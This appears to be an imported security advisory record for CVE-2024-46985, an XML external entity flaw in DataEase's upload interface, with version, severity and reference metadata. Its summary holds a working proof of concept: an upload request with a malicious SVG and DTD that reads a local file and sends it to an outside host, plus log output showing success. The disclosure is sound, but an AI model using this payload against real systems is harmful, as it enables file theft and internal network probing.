advisory_id: maven/io.dataease/common/CVE-2024-46985
datasource_id: gitlab_importer_v2/maven/io.dataease/common/CVE-2024-46985
datasource_url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/io.dataease/common/CVE-2024-46985.yml
aliases:
  - CVE-2024-46985
  - GHSA-4m9p-7xg6-f4mm
summary: |
  DataEase has an XML External Entity Reference vulnerability
  There is an XML external entity injection vulnerability in the static resource upload interface of DataEase. An attacker can construct a payload to implement intranet detection and file reading.

  1. send request:
  ```
  POST /de2api/staticResource/upload/1 HTTP/1.1
  Host: dataease.ubuntu20.vm
  Content-Length: 348
  Accept: application/json, text/plain, */*
  out_auth_platform: default
  X-DE-TOKEN: jwt
  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36
  Content-Type: multipart/form-data; boundary=----WebKitFormBoundary6OZBNygiUCAZEbMn

  ------WebKitFormBoundary6OZBNygiUCAZEbMn
  Content-Disposition: form-data; name="file"; filename="1.svg"
  Content-Type: a

  <?xml version='1.0'?>
  <!DOCTYPE xxe [
  <!ENTITY % EvilDTD SYSTEM 'http://10.168.174.1:8000/1.dtd'>
  %EvilDTD;
  %LoadOOBEnt;
  %OOB;
  ]>
  ------WebKitFormBoundary6OZBNygiUCAZEbMn--

  // 1.dtd的内容
  <!ENTITY % resource SYSTEM "file:///etc/alpine-release">
  <!ENTITY % LoadOOBEnt "<!ENTITY &#x25; OOB SYSTEM 'http://10.168.174.1:8000/?content=%resource;'>">
  ```

  2. After sending the request, the content of the file /etc/alpine-release is successfully read
  ```
  ::ffff:10.168.174.136 - - [16/Sep/2024 10:23:44] "GET /1.dtd HTTP/1.1" 200 -
  ::ffff:10.168.174.136 - - [16/Sep/2024 10:23:44] "GET /?content=3.20.0 HTTP/1.1" 200 -
  ```

  Affected versions: <= 2.10.0
impacted_packages:
  - purl: pkg:maven/io.dataease/common
    affected_versions: vers:maven/<2.10.1
    fixed_versions: vers:maven/2.10.1
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score:
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    published_at: None
    url: https://gitlab.com/gitlab-org/advisories-community/-/blob/main/maven/io.dataease/common/CVE-2024-46985.yml
weaknesses:
  - CWE-611
  - CWE-1035
  - CWE-937
references:
  - url: https://github.com/dataease/dataease
    reference_type:
    reference_id:
  - url: https://github.com/dataease/dataease/security/advisories/GHSA-4m9p-7xg6-f4mm
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-46985
    reference_type:
    reference_id: CVE-2024-46985
  - url: https://github.com/advisories/GHSA-4m9p-7xg6-f4mm
    reference_type:
    reference_id: GHSA-4m9p-7xg6-f4mm
